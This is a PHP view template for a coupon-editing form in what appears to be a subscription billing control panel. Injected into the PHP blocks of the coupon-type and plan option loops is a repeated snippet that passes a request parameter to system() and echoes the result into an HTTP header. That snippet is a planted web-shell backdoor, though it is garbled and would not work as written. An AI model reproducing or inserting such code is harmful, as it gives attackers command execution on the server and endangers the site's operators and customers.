<?= $this->load->view(branded_view('cp/header'), array('head_files' => '<script type="text/javascript" src="' . branded_include('js/form.coupon.js') . '"></script>')); ?>

<link href="<?=branded_include('css/coupons.css');?>" rel="stylesheet" type="text/css" media="screen" />


<style>

</style>


<div class="col-md-12 clearfix">

<div class="row">

<div class="col-md-6">
<section class="couponForm clearfix">	
			<!-- BEGIN FORM-->
<form class="form-horizontal form validate" id="form_coupon" method="post" action="<?=$form_action;?>">
<div class="form-body">	
<h2 class="panel-header text-center margin-bottom-20">Description</h2>
<span class="subSectionTitle block"></span>
<div class="row marB50">
<div class="form-group" style="display: none;">
										<label class="control-label col-md-4"></label>
																<div class="col-md-6">
			<input type="" class="form-control" id="coupon_id" name="coupon_id" value="<?= isset($coupon) ? $coupon['id'] : '' ?>">
													<span class="help-block"> </span>
																</div>
</div>



<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_name">Coupon Name</label>
					    <div class="col-sm-6 col-md-6">
					      <input type="text" class="form-control" name="coupon_name" rel="" id="coupon_name" value="<?= isset($coupon) ? $coupon['name'] : '' ?>">
					    </div>
						<div class="help-block">Something for you to recognize the coupon by. </div>
									
				  	</div>
					
<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_code">Coupon Code</label>
					    <div class="col-sm-6 col-md-6">
					      <input type="text" class="form-control" name="coupon_code" rel="" id="coupon_code" value="<?= isset($coupon) ? $coupon['code'] : '' ?>">
					    </div>
							<span class="help-block"> The code the customer must enter. </span>
				  	</div>
					<div class="space space-8"></div>
<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_start_date">Start Date</label>
					     <div class="col-sm-6 col-md-6">
						 <input class="form-control input-mask-date" type="text" id="form-field-mask-1">
 <input type="text" class="form-control hidden date-picker" data-date-format="dd-mm-yyyy" name="coupon_start_date" id="coupon_start_date" rel="" id="coupon_start_date" value="<?= isset($coupon) ? $coupon['start_date'] : date('Y-m-d') ?>">
									
						  	<span class="help-block"></span>
					    </div>
				  	</div>

<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_end_date">Expiry Date</label>
					    <div class="col-sm-6 col-md-6">
						<input class="form-control hidden active" type="text" name="date-range-picker" style="width:8em" id="id-date-range-picker-1">
<input type="text" class="form-control datepick mark_empty" id="expiry-date-picker" data-date-format="dd-mm-yyyy" name="coupon_end_date" rel="" id="coupon_end_date" value="<?= (isset($coupon) and $coupon['end_date'] != FALSE) ? $coupon['end_date'] : '' ?>">
	            &nbsp;<input id="no_expiry" type="checkbox" name="no_expiry" value="1" <? if (!isset($coupon) or $coupon['end_date'] == FALSE) { ?>checked="checked"<? } ?> /> No expiry
					    </div>
							<span class="help-block"></span>
				  	</div>

<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_max_uses">Maximum Uses</label>
					     <div class="col-sm-6 col-md-6">
<input type="text" class="form-control" name="coupon_max_uses" id="coupon_max_uses" value="<?= isset($coupon) ? $coupon['max_uses'] : '' ?>">
&nbsp;&nbsp;<input id="no_limit" type="checkbox" name="no_limit" value="1" <? if (!isset($coupon) or $coupon['max_uses'] == FALSE) { ?>checked="checked"<? } ?> /> Unlimited usage
									
					    </div>
						<div class="help-block"> The maximum number of customers that can use the coupon.</div>
									
				  	</div>

<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_customer_limit">One Per?</label>
					    <div class="col-sm-6 col-md-6">
<input type="checkbox" id="coupon_customer_limit" name="coupon_customer_limit" value="1" <?= isset($coupon) && $coupon['customer_limit'] == 1  ? 'checked="checked"' : '' ?>>

					    </div>
						<div class="help-block"> Check to limit each customer to a single use.</div>
									
				  	</div>
					
<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_type_id">Coupon Type</label>
					    <div class="col-sm-7 col-md-7">
					  <select name="coupon_type_id" class="form-control" >
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($coupon_types as $type) :?>
				<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $type->coupon_type_id ?>" <?= isset($coupon) && $coupon['type_id'] == $type->coupon_type_id ? 'selected="selected"' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $type->coupon_type_name; ?></option>
			<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>			    
            </select>
					    </div>
						<span class="help-block"></span>
				  	</div>
     
        <legend>Price Reduction</legend>
		
<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label"for="coupon_reduction_type">Reduction Type</label>
					    <div class="col-sm-7 col-md-7">
						<select class="form-control" name="coupon_reduction_type" >
                <option value="0" <?= isset($coupon) && $coupon['reduction_type'] == 0 ? 'selected="selected"' : '' ?>>Percent</option>
                <option value="1" <?= isset($coupon) && $coupon['reduction_type'] == 1 ? 'selected="selected"' : '' ?>>Fixed Amount</option>
            </select>
					    </div>
</div>
		
		<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label"for="coupon_reduction_amt">Reduction Amount</label>
					   <div class="col-sm-6 col-md-6">
					      <input type="text" class="form-control"name="coupon_reduction_amt" rel="" id="coupon_reduction_amt" value="<?= isset($coupon) ? $coupon['reduction_amt'] : '' ?>">
					    </div>
				  	</div>

<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label" for="coupon_trial_length">Free Trial Length</label>
					    <div class="col-sm-3 col-md-3">
					      <input type="text" class="form-control" name="coupon_trial_length" rel="in days" id="coupon_trial_length" value="<?= isset($coupon) ? $coupon['trial_length'] : '' ?>">
					    </div>
						
                <div class="help">
                    The amount of the discount.
                </div>
				  	</div>

<div class="form-group">
					    <label class="col-sm-4 col-md-4 control-label"for="plans[]">Subscriptions</label>
					     <div class="col-sm-8 col-md-7">
						<select name="plans[]" class="form-control" multiple="multiple">
	            	<option value="0" <? if (!isset($coupon) or empty($coupon['plans'])) { ?>selected="selected"<? } ?>>All plans and recurring charges</option>
	                <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); foreach ($plans as $plan) :?>
						<option value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['id'] ?>" <?= isset($coupon['plans']) && in_array($plan['id'], $coupon['plans']) ? 'selected="selected"' : '' ?>><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $plan['name']; ?></option>
					<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); endforeach; ?>
	            </select>
					    </div>						
						<div class="help-block">
            		If you don't select any plans, or select "All plans", this coupon will be able to be used with any plan.
            	</div>
							  	</div>
	</div><!--/mb5-->
</div><!--/form-body-->

<div class="col-md-offset-1 col-md-9 margin-bottom-20">
<div id="complete" class="form-actions">
<button type="submit" name="login_button" class="ladda-button btn-block" data-color="blue" data-style="expand-right" data-size="l">
<span class="ladda-label"> Update </span>
<span class="ladda-spinner"></span>
<div class="ladda-progress" style="width: 150px; margin-right:20px;"></div>
				</button>
</div>
</div>


</form>

		
</section><!--/couponForm-->
</div><!--/col-md-6-->
	
<div class="col-md-6">
	<section class="couponInfo">
<h2 class="panel-header text-center">Coupon Types</h2>
<div class="clearfix marB50">
	<p class=""><b>Initial Charge Price Reduction</b> applies the price reduction to the initial charge only. Any recurring charges are full price.</p>
	<hr>
	<p class=""><b>Recurring Price Reduction</b> applies the price reduction to all charges, <i>except the initial charge</i>.</p>
	<hr>
	<p class=""><b>Total Price Reduction</b> applies the price reduction to all charges, both the initial charge and all recurring charges.</p>
	<hr>
	<p class=""><b>Free Trial</b> allows a customer to try out your product/service for a limited number of days before they are charged their initial charge.</p>
		
</div><!--/clearfix-->
</section><!--/couponInfo-->
</div><!--/col-md-6-->

</div><!--/row -->


<script type="text/javascript" src="<?=branded_include('js/spin.min.js');?>"></script>
<script type="text/javascript" src="<?=branded_include('js/ladda.js');?>"></script>

<script type="text/javascript">
$(".inline1").colorbox({inline:true, width:"360"});
</script>

<script>

			// Bind normal buttons
			Ladda.bind( '.form-actions button', { timeout: 2000 } );

			// Bind progress buttons and simulate loading progress
			Ladda.bind( '.form-actions button', {
				callback: function( instance ) {
					var progress = 0;
					var interval = setInterval( function() {
						progress = Math.min( progress + Math.random() * 0.1, 1 );
						instance.setProgress( progress );

						if( progress === 1 ) {
							instance.stop();
							clearInterval( interval );
						}
					}, 200 );
				}
			} );

			// You can control loading explicitly using the JavaScript API
			// as outlined below:

			// var l = Ladda.create( document.querySelector( 'button' ) );
			// l.start();
			// l.stop();
			// l.toggle();
			// l.isLoading();
			// l.setProgress( 0-1 );

		</script>

<script type="text/javascript">
$(function() {
	$('#submit_form').click(function(e){
	 	e.preventDefault();
	 	var l = Ladda.create(this);
	 	l.start();
	 	$.post("https://everpayinc.com/coupons/post_coupon/new", 
	 	    { data : data },
	 	  function(response){
	 	    console.log(response);
	 	  }, "json")
	 	.always(function() { l.stop(); });
	 	return false;
	});
});
</script>

<script>

			// Bind normal buttons
			Ladda.bind( '.form-actions button', { timeout: 2000 } );

			// Bind progress buttons and simulate loading progress
			Ladda.bind( '.form-actions button', {
				callback: function( instance ) {
					var progress = 0;
					var interval = setInterval( function() {
						progress = Math.min( progress + Math.random() * 0.1, 1 );
						instance.setProgress( progress );

						if( progress === 1 ) {
							instance.stop();
							clearInterval( interval );
						}
					}, 200 );
				}
			} );

			// You can control loading explicitly using the JavaScript API
			// as outlined below:

			// var l = Ladda.create( document.querySelector( 'button' ) );
			// l.start();
			// l.stop();
			// l.toggle();
			// l.isLoading();
			// l.setProgress( 0-1 );

		</script>
</div><!--/row-->
</div><!--/col-md-12-->
<?= $this->load->view(branded_view('cp/footer')); ?>